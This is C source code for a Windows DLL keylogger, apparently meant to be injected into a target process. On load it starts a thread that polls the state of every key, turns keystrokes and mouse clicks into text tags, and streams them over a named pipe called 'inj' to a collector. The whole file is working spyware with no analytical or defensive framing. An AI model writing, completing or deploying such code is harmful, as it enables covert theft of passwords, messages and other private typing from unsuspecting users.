#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#define PIPE_NAME "\\\\.\\pipe\\inj"

DWORD processId = 0;
HANDLE hPipe;

static BOOL OpenLogFile()
{
    hPipe = CreateFileA(
        PIPE_NAME,          // Filename
        GENERIC_WRITE,      // Desired access
        FILE_SHARE_READ |
        FILE_SHARE_WRITE,   // Share mode (no sharing)
        NULL,               // Security attributes
        OPEN_EXISTING,      // Open existing pipe
        0,                  // Flags and attributes
        NULL                // Template file
    );
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;
    
    return TRUE;
    
}

static void WriteLog(const WCHAR *format, ...)
{
    if (hPipe == INVALID_HANDLE_VALUE)
        if(!OpenLogFile()) return;

    // Use a variable argument list
    va_list args;
    va_start(args, format);

    // Format the wide string
    WCHAR buffer[1024]; // Adjust the buffer size as needed
    _vsnwprintf_s(buffer, sizeof(buffer) / sizeof(wchar_t), _TRUNCATE, format, args);

    // Clean up the variable argument list
    va_end(args);

    // Convert the wide string to a multi-byte string
    char mbBuffer[sizeof(buffer)];
    size_t convertedChars;
    wcstombs_s(&convertedChars, mbBuffer, sizeof(mbBuffer), buffer, _TRUNCATE);

    DWORD bytesWritten = 0;
    // Write the multi-byte string to the pipe
    WriteFile(hPipe, mbBuffer, wcslen(buffer) * sizeof(WCHAR), &bytesWritten, NULL);
    FlushFileBuffers(hPipe);
}

static void CloseLogFile()
{
    if (hPipe == INVALID_HANDLE_VALUE)
        return;
    CloseHandle(hPipe);
}

static inline void ShiftPressed()
{
        if(GetAsyncKeyState(VK_SHIFT) & 0x8000 || GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000)
            WriteLog(L"[^]");
}

static void PrintKey(BYTE pKey)
{
    switch(pKey)
    {
    case VK_SHIFT:
        break;
    case 0x41 ... 0x5A:
        ShiftPressed();
        WriteLog(L"%c", pKey);
        break;
    case 0x30 ... 0x39:
        ShiftPressed();
        WriteLog(L"%c", pKey);
        break;
    case VK_OEM_PERIOD:
        ShiftPressed();
        WriteLog(L".");
        break;
    case VK_OEM_1:
        ShiftPressed();
        WriteLog(L";");
        break;
    case VK_OEM_2: 
        ShiftPressed();
        WriteLog(L"/");
        break;
    case VK_OEM_3: 
        ShiftPressed();
        WriteLog(L"`");
        break;
    case VK_OEM_4:
        ShiftPressed();
        WriteLog(L"[");
        break;
    case VK_OEM_5:
        ShiftPressed();
        WriteLog(L"\\");
        break;
    case VK_OEM_6:
        ShiftPressed();
        WriteLog(L"]");
        break;
    case VK_OEM_7:
        ShiftPressed();
        WriteLog(L"'");
        break;
    case VK_OEM_102:
        ShiftPressed();
        WriteLog(L"\\");
        break;
    case VK_OEM_MINUS:
        ShiftPressed();
        WriteLog(L"-");
        break;
    case VK_OEM_PLUS: 
        ShiftPressed();
        WriteLog(L"+");
        break;
    case VK_OEM_COMMA:
        ShiftPressed();
        WriteLog(L",");
        break;
    case VK_BACK:
        ShiftPressed();
        WriteLog(L"[BCKSP]");
        break;
    case VK_LBUTTON:
        ShiftPressed();
        WriteLog(L"[LMB]");
        break;
    case VK_RBUTTON:
        ShiftPressed();
        WriteLog(L"[RMB]");
        break;
    case VK_RETURN:
        ShiftPressed();
        WriteLog(L"[ENT]\n");
        break;
    case VK_TAB:
        ShiftPressed();
        WriteLog(L"[TAB]");
        break;
    case VK_ESCAPE:
        ShiftPressed();
        WriteLog(L"[ESC]");
        break;
    case VK_CONTROL:
        ShiftPressed();
        WriteLog(L"[CTRL]");
        break;
    case VK_MENU:
        ShiftPressed();
        WriteLog(L"[ALT]");
        break;
    case VK_CAPITAL:
        ShiftPressed();
        WriteLog(L"[CAP]");
        break;
    case VK_SPACE:
        ShiftPressed();
        WriteLog(L" ");
        break;
    case VK_UP:
        ShiftPressed();
        WriteLog(L"[UP]");
        break;    
    case VK_DOWN:
        ShiftPressed();
        WriteLog(L"[DOWN]");
        break;
    case VK_LEFT:
        ShiftPressed();
        WriteLog(L"[LEFT]");
        break;
    case VK_RIGHT:
        ShiftPressed();
        WriteLog(L"[RIGHT]");
        break;
    case VK_LSHIFT: break;
    case VK_RSHIFT: break;
    case VK_LCONTROL: break;
    case VK_RCONTROL: break;
    case VK_LMENU: break;
    case VK_RMENU: break;
    case VK_LWIN: 
        ShiftPressed();
        WriteLog(L"[WIN]");
        break;
    case VK_RWIN:
        ShiftPressed();
        WriteLog(L"[WIN]");
        break;
    default:
        ShiftPressed();
        WriteLog(L"[0x%x]", pKey & 0xff);
        break;
    }
}

DWORD WINAPI KeylogThread(LPVOID lpParam)
{
    processId = GetCurrentProcessId();
    if(!OpenLogFile())
    {
        Sleep(100);
        if(!OpenLogFile()) return -1;
    }
    Sleep(150);
    WriteLog(L"[+] Starting keylog routine...\n");
    while(1)
    {
        Sleep(40);
        for(BYTE i = 11; i <= 255; i++) 
        {
            if(GetAsyncKeyState(i) & 0x0001)
            {
                PrintKey(i);
            }
        }
    }
}

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_THREAD_ATTACH:
        break;
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, KeylogThread, NULL, 0, NULL);
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        WriteLog(L"[+] Stopping keylogging routine.\n");
        CloseLogFile();
        break;
    }
    return TRUE;
}